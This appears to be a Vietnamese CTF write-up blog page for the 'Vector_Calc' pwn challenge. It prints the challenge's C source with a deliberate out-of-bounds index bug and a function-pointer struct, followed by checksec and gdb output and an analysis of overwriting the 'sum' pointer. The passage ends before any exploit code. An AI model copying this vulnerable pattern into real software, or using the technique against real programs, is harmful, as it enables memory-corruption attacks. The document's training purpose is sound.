<!DOCTYPE html>
<html class="" lang="en-us"><head>
    
    <meta name="viewport" content="width=device-width" />
    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=7" />

    <link
    rel="icon"
    href='/favicon.png'
/>
<link
    rel="shortcut icon"
    href='/favicon.ico'
    type="image/x-icon"
/>
<link
    rel="apple-touch-icon"
    href='/apple-touch-icon.png'
/>

    <link
        rel="icon"
        href='/logo.svg'
        type="image/svg+xml"
    />

<title>
        
            W1 Test  &ndash;
        
        w1n-gl0ry&#39;s
    </title>

    
    <link href="/symbols-nerd-font/symbols-nerd-font.css" rel="stylesheet" integrity="sha512-lydow8GLOLlYNOtHlksNCmGWWCBsbIEtikXpHzfWqx78HLlyQZHOzyLwPpKol4Th6aCwLUXOfODVYgwrd3nwKQ=="/>
    <link href="/jetbrains-mono/jetbrains-mono.css" rel="stylesheet" integrity="sha512-tJxlgL6v1Y7kFf+qB8SloaAMKnOAw6WouknxXtIjkBux9Y/9aX81EUWOJO8c/3l98DmjG8brr4to7zaez606Fg=="/>

    
    
    <link type="text/css" rel="stylesheet" href=https://w1n-gl0ry.github.io/css/styles.abbd6311bb4b6ca58f8e7398140529245ae0f6428b759fcd830742eee2619eabb900ba9914a9affb82aa9a16a9b9ea727bb315315a976a0db0e7513a5f12c504.css integrity="sha512-q71jEbtLbKWPjnOYFAUpJFrg9kKLdZ/NgwdC7uJhnqu5ALqZFKmv&#43;4Kqmhapuepye7MVMVqXag2w51E6XxLFBA==" />
<meta name="author" content="botton" />

    
        <meta name="keywords" content='ctf, pwn, test' />
    
    
        <meta name="description" content="Writeups for some challenges in W1 Test" />
    

<meta property="og:site_name"
    content='w1n-gl0ry&#39;s' />

    <meta property="og:title" content="W1 Test" />
    <meta property="og:type" content="article" />
    
    <meta
        property="article:author" content="botton" />
    <meta
        property="article:published_time"
        content='2023-08-01T17:37:11Z&#43;0800' />
    
        
            <meta property="article:tag" content="ctf" />
        
            <meta property="article:tag" content="pwn" />
        
            <meta property="article:tag" content="test" />
        
    
    <meta property="og:url" content="https://w1n-gl0ry.github.io/posts/training/" />
    
    
    <meta property="og:image"
        content="https://w1n-gl0ry.github.io/icon512.png" />
    
        <meta property="og:description" content="Writeups for some challenges in W1 Test" />
    

<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:domain"
      content='w1n-gl0ry.github.io'
/>
<meta property="twitter:url" content="https://w1n-gl0ry.github.io/posts/training/" />


    <meta name="twitter:title" content="W1 Test" />
    
    
    
    <meta name="twitter:image"
        content="https://w1n-gl0ry.github.io/icon512.png" />
    
        <meta name="twitter:description" content="Writeups for some challenges in W1 Test" />
    

<link rel="manifest" href="/manifest/index.json" />
</head>


<body>
        <div id="baseContainer"><header class="">
<div class="titleAndSearchContainer">
        <div id="titleContainer">
            
                <a class="unstyledLink" href="/">
                    <img src='/logo.svg' alt='Logo'/>
                </a>
            
            <div class="rightOfLogo">
                <div class="titleAndHamburger">
                    <h1>
                        <a class="unstyledLink" href="/">w1n-gl0ry&#39;s</a>
                        
                    </h1>
                    
                </div>
                <div id="wide_nav"><nav>
    
    <ul id="main-nav">
        <li><a href="/">Home</a></li>
        
            <li><a href="/posts/">Posts</a></li>
        
        
        
        
        
        
            <li><a href="https://w1n-gl0ry.github.io/about/about/">About</a></li>
        
        
            <li><a href="/tags/">Tags</a></li>
        
        
    </ul>
</nav>
</div>
            </div>
        </div>
        <div class="search">
    <input id="searchbar" type="text" placeholder='Search' />
    <span class="nerdlink" onclick="newSearch();">&#xf002;</span>
</div>
<script>
    function newSearch() {
        let term = searchbar.value.trim();
        if (!term) return;
        location.href = `/search/?q=${term}`;
    }
    searchbar.onkeyup = (ev) => {if (ev.keyCode == 13) newSearch()};
</script>

    </div>
    <div id="links">
        <a
    
        rel="noreferrer"
    
    target="_blank"
    class="nerdlink"
    href="/index.xml">
    
    
        &#xf09e;
    
    <span>
        RSS
    </span>
</a>

        
        <a
    
        rel="noreferrer"
    
    target="_blank"
    class="nerdlink"
    href="https://github.com/w1n-gl0ry">
    
    
        &#xf09b;
    
    <span>
        GitHab
    </span>
</a>
<a
    
        rel="noreferrer"
    
    target="_blank"
    class="nerdlink"
    href="https://twitter.com/botton3310">
    
    
        &#xf099;
    
    <span>
        Titter
    </span>
</a>

    </div>
    

</header>
<div id="contentContainer">
                <div id="content">
                    <main>
<article class="card single">
    
        <h1>W1 Test</h1>
    
    
        <p class="date">
            <span title='Date'> </span>
    2023-08-01

</p>
    
    
    
    <div class="articleToc">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#overview">Overview</a></li>
    <li><a href="#pwn">PWN</a>
      <ul>
        <li><a href="#vector_calc">Vector_Calc</a></li>
        <li><a href="#vector_calc-revenge">Vector_Calc Revenge</a></li>
      </ul>
    </li>
    <li><a href="#reverse">Reverse</a>
      <ul>
        <li><a href="#wanna-one-vpn">wanna-one vpn</a></li>
        <li><a href="#wanna-one-vault">wanna-one vault</a></li>
        <li><a href="#wanna-one-intels">wanna-one intels</a></li>
        <li><a href="#pu-pu-flag-checker">Pu Pu flag checker</a></li>
      </ul>
    </li>
  </ul>
</nav>
    <hr />
</div>

    <div><h1 id="overview">Overview</h1>
<p>Tuần vừa rồi mình có tham gia giải mini-CTF về 3 mảng (web, forensics, crypto) của CLB W1. Tuần này quay trở lại bài test về binary (gồm Pwn và Reverse), bài test gồm 2 bài Pwn và 5 bài Reverse, mình đã hoàn thành 6/7 bài. Mình xin trình bày một số bài mà mình đã làm được</p>
<h1 id="pwn">PWN</h1>
<h2 id="vector_calc">Vector_Calc</h2>
<p><code>Host: nc 45.122.249.68 20017</code></p>
<p><code>Description: My vector calculator is complete. However, I feel something is not right about this program. Can you find it?</code></p>
<p><code>Chall file:</code> <a href="https://github.com/w1n-gl0ry/CTF/blob/main/2023/miniCTF/pwn/VectorCALC/chall">bin</a>, <a href="https://github.com/w1n-gl0ry/CTF/blob/main/2023/miniCTF/pwn/VectorCALC/src/chall.c">src</a></p>
<p><a href="https://github.com/w1n-gl0ry/CTF/blob/main/2023/miniCTF/pwn/VectorCALC/src/chall.c">chall.c</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define MAX_FAVES 4
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define MAX_VECTORS 3
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">struct</span> Vector{
</span></span><span style="display:flex;"><span>__uint64_t x;
</span></span><span style="display:flex;"><span>__uint64_t y;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>printFunc)(<span style="color:#66d9ef">struct</span> Vector<span style="color:#f92672">*</span>);
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> Vector v_list[MAX_VECTORS];
</span></span><span style="display:flex;"><span>__uint64_t<span style="color:#f92672">*</span> sum;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span><span style="color:#f92672">*</span> faves[MAX_FAVES];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">printData</span>(<span style="color:#66d9ef">struct</span> Vector<span style="color:#f92672">*</span> v);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">enterData</span>(){
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> Vector<span style="color:#f92672">*</span> v;
</span></span><span style="display:flex;"><span>    __uint64_t idx;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Index: &#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%lu&#34;</span>,<span style="color:#f92672">&amp;</span>idx);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(idx <span style="color:#f92672">&gt;</span> MAX_VECTORS){
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Invaild index!&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    v <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>v_list[idx];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    v<span style="color:#f92672">-&gt;</span>printFunc <span style="color:#f92672">=</span> printData;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Enter x: &#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%lu&#34;</span>,<span style="color:#f92672">&amp;</span>v<span style="color:#f92672">-&gt;</span>x);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Enter y: &#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%lu&#34;</span>,<span style="color:#f92672">&amp;</span>v<span style="color:#f92672">-&gt;</span>y);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">printData</span>(<span style="color:#66d9ef">struct</span> Vector<span style="color:#f92672">*</span> v){
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Data: &#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;v = [%lu %lu]</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,v<span style="color:#f92672">-&gt;</span>x,v<span style="color:#f92672">-&gt;</span>y);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">sumVector</span>(){
</span></span><span style="display:flex;"><span>    __uint64_t idx;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Save the sum to index: &#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%lu&#34;</span>,<span style="color:#f92672">&amp;</span>idx);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(idx <span style="color:#f92672">&gt;</span> MAX_VECTORS){
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Invaild index!&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    sum <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>v_list[idx];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(__uint64_t i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> ; i <span style="color:#f92672">&lt;</span> MAX_VECTORS ;<span style="color:#f92672">++</span>i){
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>( i <span style="color:#f92672">!=</span> idx){
</span></span><span style="display:flex;"><span>            ((<span style="color:#66d9ef">struct</span> Vector <span style="color:#f92672">*</span>)sum)<span style="color:#f92672">-&gt;</span>x <span style="color:#f92672">+=</span> v_list[idx].x;
</span></span><span style="display:flex;"><span>            ((<span style="color:#66d9ef">struct</span> Vector <span style="color:#f92672">*</span>)sum)<span style="color:#f92672">-&gt;</span>y <span style="color:#f92672">+=</span> v_list[idx].y;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">loadFavorite</span>(){
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(sum <span style="color:#f92672">==</span> NULL){
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;You must set the sum before!&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    __uint64_t idx;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Index: &#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%lu&#34;</span>,<span style="color:#f92672">&amp;</span>idx);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(idx <span style="color:#f92672">&gt;=</span> MAX_FAVES){
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Invaild index!&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    faves[idx] <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(<span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> Vector));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    ((<span style="color:#66d9ef">struct</span> Vector <span style="color:#f92672">*</span>)faves[idx])<span style="color:#f92672">-&gt;</span>printFunc <span style="color:#f92672">=</span> printData;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memcpy</span>(faves[idx],<span style="color:#f92672">&amp;</span>sum[idx], <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> Vector));
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">printFavorite</span>(){
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(sum <span style="color:#f92672">==</span> NULL){
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;You must set the sum before!&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    __uint64_t idx;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Index: &#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%lu&#34;</span>,<span style="color:#f92672">&amp;</span>idx);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(idx <span style="color:#f92672">&gt;=</span> MAX_FAVES <span style="color:#f92672">||</span> faves[idx] <span style="color:#f92672">==</span> NULL){
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Invaild index!&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>( ((__uint64_t <span style="color:#f92672">*</span>)faves[idx])[<span style="color:#ae81ff">2</span>] )
</span></span><span style="display:flex;"><span>        ((<span style="color:#66d9ef">struct</span> Vector <span style="color:#f92672">*</span>)faves[idx])<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">printFunc</span>(faves[idx]);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> 
</span></span><span style="display:flex;"><span>        ((<span style="color:#66d9ef">struct</span> Vector <span style="color:#f92672">*</span>)sum)<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">printFunc</span>(faves[idx]);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">addFavorute</span>(){
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    __uint64_t idx;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Index: &#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%lu&#34;</span>,<span style="color:#f92672">&amp;</span>idx);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(idx <span style="color:#f92672">&gt;=</span> MAX_FAVES <span style="color:#f92672">||</span> faves[idx] <span style="color:#f92672">==</span> NULL){
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Invaild index!&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    ((<span style="color:#66d9ef">struct</span> Vector <span style="color:#f92672">*</span>)sum)<span style="color:#f92672">-&gt;</span>x <span style="color:#f92672">+=</span> ((<span style="color:#66d9ef">struct</span> Vector <span style="color:#f92672">*</span>)faves[idx])<span style="color:#f92672">-&gt;</span>x;
</span></span><span style="display:flex;"><span>    ((<span style="color:#66d9ef">struct</span> Vector <span style="color:#f92672">*</span>)sum)<span style="color:#f92672">-&gt;</span>y <span style="color:#f92672">+=</span> ((<span style="color:#66d9ef">struct</span> Vector <span style="color:#f92672">*</span>)faves[idx])<span style="color:#f92672">-&gt;</span>y;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">init</span>(){
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">setbuf</span>(stdin,NULL);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">setbuf</span>(stdout,NULL);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(__uint64_t i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> ; i <span style="color:#f92672">&lt;</span> MAX_VECTORS ;<span style="color:#f92672">++</span>i){
</span></span><span style="display:flex;"><span>        v_list[i].printFunc <span style="color:#f92672">=</span> printData;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">printMenu</span>(){
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;1. Enter data.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;2. Sum vector.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;3. Print sum vector</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;4. Save sum to favorite</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;5. Print favorite</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;6. Add favorite to the sum</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;&gt; &#34;</span>
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span><span style="color:#f92672">**</span> argv, <span style="color:#66d9ef">char</span><span style="color:#f92672">**</span> envp){
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">init</span>();
</span></span><span style="display:flex;"><span>    __uint32_t choice ;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span>(<span style="color:#ae81ff">1</span>){
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printMenu</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%u&#34;</span>, <span style="color:#f92672">&amp;</span>choice);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">switch</span> (choice)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">enterData</span>();
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">sumVector</span>();
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">3</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            ((<span style="color:#66d9ef">struct</span> Vector <span style="color:#f92672">*</span>)sum)<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">printFunc</span>(sum);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">4</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">loadFavorite</span>();
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">5</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">printFavorite</span>();
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">6</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">addFavorute</span>();
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Invaild option!&#34;</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">w1n</span>(); <span style="color:#75715e">// try to view the code in a disassembler :)
</span></span></span></code></pre></div><p>Ban đầu, dùng checksec() để kiểm tra các chế độ bảo vệ của file:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>─   ~/CTF/wannagame/calc                                                                                                       ✘ INT  31m 0s  03:54:35 ─╮
</span></span><span style="display:flex;"><span>╰─❯ checksec chall                                                                                                                                          ─╯
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/home/w1n-gl0ry/CTF/wannagame/calc/chall&#39;</span>
</span></span><span style="display:flex;"><span>    Arch:     amd64-64-little
</span></span><span style="display:flex;"><span>    RELRO:    Full RELRO
</span></span><span style="display:flex;"><span>    Stack:    Canary found
</span></span><span style="display:flex;"><span>    NX:       NX enabled
</span></span><span style="display:flex;"><span>    PIE:      PIE enabled
</span></span></code></pre></div><p>Full chế độ được bật!</p>
<p>Nhìn sơ qua thì ta thấy chương trình khai báo 1 <code>struct Vector</code> có dạng gồm 2 số nguyên không dấu và 1 con trỏ đến hàm nhận tham số kiểu (struct Vector*)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> Vector{
</span></span><span style="display:flex;"><span>__uint64_t x;
</span></span><span style="display:flex;"><span>__uint64_t y;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>printFunc)(<span style="color:#66d9ef">struct</span> Vector<span style="color:#f92672">*</span>);
</span></span><span style="display:flex;"><span>};
</span></span></code></pre></div><p>Tiếp tục, mảng <code>v_list</code> chứa tối đa 3 phần tử kiểu <code>Vector</code>, biến con trỏ <code>sum</code> và mảng chứa tối đa 4 con trỏ <code>faves</code></p>
<p>Đến đây thì chưa có gì rõ ràng, ta tiếp tục vào các chức năng chính của chương trình, ta có thể khái quát lại như sau:</p>
<pre><code>Hàm enterData(): Nhập vào index muốn mà mình muốn nhập các chỉ số x, y của struct v , nếu index &gt; 3 -&gt; exit 
Hàm printData(): Dùng để in ra màn hình 2 chỉ số x, y của struct
Hàm sumVector(): Dùng để lưu tổng tất cả các chỉ số x, y (không bao gồm chỉ số của index được chọn), index được chọn sẽ là nơi để lưu tổng của các chỉ số x, y
Hàm loadFavorite(): Nhập vào index của struct mà ta muốn lưu trên heap bằng cách gọi malloc(sizeof(struct Vector)) rồi lưu địa chỉ trên mảng con trỏ faves[index] đã được khai báo đầu chương trình
Hàm printFavorite(): In ra 2 chỉ số x,y trên heap vừa lưu
Hàm addFavorute(): cộng vào 2 chỉ số x, y biến con trỏ sum chứa 1 struct của mảng v_list với 2 chỉ số x, y trên heap tại index mà ta nhập vào
</code></pre>
<p>-&gt; Như đã phân tích trên, chương trình chỉ đơn giản có 6 chức năng, ta tiến hành tìm bug để thực hiện khai thác</p>
<p>Nhìn qua thì có vẻ không có bug gì, nhưng fuzz 1 hồi, mình để ý là ở hàm <code>enterData()</code>, chương trình thực hiện check index của mình nhập vào, nhưng lại không check khi index bằng 3 -&gt; Dẫn tới lỗi OOB, dựa vào đó ta có thể ghi đè biến <code>sum</code> các địa chỉ hợp lí để có thể khai thác</p>
<p>Mình tiến hành debug bằng <code>gdb()</code> để kiểm tra thật sự là mình có thể ghi đè biến sum không, và sau đây là kết quả khi mình nhập index 3:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>09:0048│  0x555555558088 <span style="color:#f92672">(</span>sum<span style="color:#f92672">)</span> ◂— 0xdeadbeef
</span></span><span style="display:flex;"><span>0a:0050│  0x555555558090 ◂— 0xdeadbeef
</span></span><span style="display:flex;"><span>0b:0058│  0x555555558098 —▸ 0x55555555535d <span style="color:#f92672">(</span>printData<span style="color:#f92672">)</span> ◂— endbr64 
</span></span></code></pre></div><p>-&gt; Thật sự, mình có thể ghi đè biến sum, đây là mấu chốt quan trọng để mình thực hiện các bước tiếp theo</p>
<p>Nhưng để viết vào biến <code>sum</code> 1 địa chỉ hợp lệ thì trước hết ta phải cần có địa chỉ base của PIE, và cũng có thể leak địa chỉ libc() base nếu chúng ta không có địa chỉ của hàm nào thật sự exploit được trong binary.</p>
